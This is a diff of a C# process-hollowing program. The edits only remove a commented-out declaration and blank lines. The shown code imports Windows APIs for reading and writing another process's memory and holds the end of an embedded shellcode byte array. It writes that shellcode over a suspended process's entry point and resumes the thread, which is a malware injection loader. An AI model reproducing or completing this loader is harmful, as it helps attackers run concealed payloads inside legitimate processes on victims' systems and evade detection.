@@ -56,25 +56,14 @@ namespace ProcessHollowing
         [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
         lpProcessInformation);
 
-        // API ZwQueryInformationProcess
-        /*[DllImport("ntdll.dll", SetLastError = true)]
-        static extern UInt32 ZwQueryInformationProcess(
-        IntPtr hProcess,
-        PROCESS_INFORMATION_CLASS procInformationClass,
-        ref PROCESS_BASIC_INFORMATION procInformation,
-        UInt32 ProcInfoLen,
-        ref UInt32 retlen);
-        */
         [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
         private static extern int ZwQueryInformationProcess(IntPtr hProcess,
         int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
         uint ProcInfoLen, ref uint retlen);
 
-
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
         [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-
 
         [DllImport("kernel32.dll")]
         static extern bool WriteProcessMemory(
@@ -87,8 +76,6 @@ namespace ProcessHollowing
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
-
-
 
         static void Main(string[] args)
         {
@@ -170,11 +157,8 @@ namespace ProcessHollowing
 0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,
 0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };
 
-
             WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
-
             ResumeThread(pi.hThread);
-
         }
     }
 }
